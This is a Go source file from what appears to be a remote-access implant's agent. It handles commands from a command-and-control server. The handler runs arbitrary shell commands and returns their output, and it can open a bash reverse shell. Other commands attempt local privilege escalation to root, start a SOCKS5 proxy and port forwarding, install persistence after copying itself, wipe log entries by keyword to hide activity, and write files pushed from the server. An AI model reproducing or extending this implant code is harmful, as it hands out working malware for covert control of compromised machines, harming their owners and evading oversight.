package agent

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
)

// exec cmd, receive data, etc
func processCCData(data *MsgTunData) {
	var (
		data2send   MsgTunData
		out         string
		outCombined []byte
		err         error
	)
	data2send.Tag = Tag

	payloadSplit := strings.Split(data.Payload, OpSep)
	op := payloadSplit[0]

	switch op {

	// command from CC
	case "cmd":
		cmdSlice := strings.Fields(payloadSplit[1])

		// # shell helpers
		if strings.HasPrefix(cmdSlice[0], "#") {
			out = shellHelper(cmdSlice)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// change directory
		if cmdSlice[0] == "cd" {
			if len(cmdSlice) != 2 {
				return
			}

			if os.Chdir(cmdSlice[1]) == nil {
				out = "changed directory to " + cmdSlice[1]
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}
		}

		// bash reverse shell
		if cmdSlice[0] == "bash" {
			if len(cmdSlice) != 2 {
				return
			}
			token := cmdSlice[1]
			err = ActivateShell(token)
			if err != nil {
				out = err.Error()
				data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
				goto send
			}
			return
		}

		// current working directory
		if cmdSlice[0] == "pwd" {
			if len(cmdSlice) != 1 {
				return
			}

			pwd, err := os.Getwd()
			if err != nil {
				log.Println("processCCData: cant get pwd: ", err)
				pwd = err.Error()
			}

			out = "current working directory: " + pwd
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		/*
		   !command: special commands (not sent by user)
		*/

		// LPE helper
		if strings.HasPrefix(cmdSlice[0], "!lpe_") {
			helper := strings.TrimPrefix(cmdSlice[0], "!")
			out = lpeHelper(helper)
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// proxy server
		if cmdSlice[0] == "!proxy" {
			if len(cmdSlice) != 3 {
				log.Printf("args error: %s", cmdSlice)
				return
			}
			log.Printf("Got proxy request: %s", cmdSlice)
			port := cmdSlice[2]
			err = Socks5Proxy(cmdSlice[1], "127.0.0.1:"+port)
			if err != nil {
				log.Printf("Failed to start Socks5Proxy: %v", err)
			}
			return
		}

		// port fwd
		if cmdSlice[0] == "!port_fwd" {
			if len(cmdSlice) != 3 {
				return
			}
			switch cmdSlice[2] {
			case "stop":
				sessionID := cmdSlice[1]
				pf, exist := PortFwds[sessionID]
				if exist {
					pf.Cancel()
				}
			default:
				go func() {
					to := cmdSlice[1]
					sessionID := cmdSlice[2]
					err = PortFwd(to, sessionID)
					if err != nil {
						log.Printf("PortFwd failed: %v", err)
					}
				}()
			}

			return
		}

		// download utils.zip
		if cmdSlice[0] == "!utils" {
			out = vaccineHandler()
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// persistence
		if cmdSlice[0] == "!persistence" {
			if len(cmdSlice) != 2 {
				return
			}
			out = "Success"
			SelfCopy()
			if cmdSlice[1] == "all" {
				err = PersistAllInOne()
				if err != nil {
					log.Print(err)
					out = fmt.Sprintf("Result: %v", err)
				}
			} else {
				out = "No such method available"
				if method, exists := PersistMethods[cmdSlice[1]]; exists {
					out = "Success"
					err = method()
					if err != nil {
						log.Println(err)
						out = fmt.Sprintf("Result: %v", err)
					}
				}
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// get_root
		if cmdSlice[0] == "!get_root" {
			if os.Geteuid() == 0 {
				out = "You already have root!"
			} else {
				err = GetRoot()
				out = fmt.Sprintf("LPE exploit failed:\n%v", err)
				if err == nil {
					out = "Got root!"
				}
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// log cleaner
		if cmdSlice[0] == "!clean_log" {
			if len(cmdSlice) != 2 {
				return
			}
			keyword := cmdSlice[1]
			out = "Done"
			err = CleanAllByKeyword(keyword)
			if err != nil {
				out = err.Error()
			}
			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
			goto send
		}

		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		cmd := exec.Command("sh", "-c", strings.Join(cmdSlice, " "))
		outCombined, err = cmd.CombinedOutput()
		if err != nil {
			log.Println(err)
			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
		}

		out = string(outCombined)
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)

	// #put file from CC
	case "FILE":
		if len(payloadSplit) != 3 {
			data2send.Payload = "#put failed: malformed #put command"
			goto send
		}

		// where to save the file
		path := payloadSplit[1]
		data := payloadSplit[2]

		// decode
		decData, err := base64.StdEncoding.DecodeString(data)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}

		// write file
		err = ioutil.WriteFile(path, decData, 0600)
		if err != nil {
			data2send.Payload = fmt.Sprintf("#put %s failed: %v", path, err)
			goto send
		}
		log.Printf("Saved %s from CC", path)
		data2send.Payload = fmt.Sprintf("#put %s successfully done", path)

	default:
	}

send:
	if err = Send2CC(&data2send); err != nil {
		log.Println(err)
	}
}
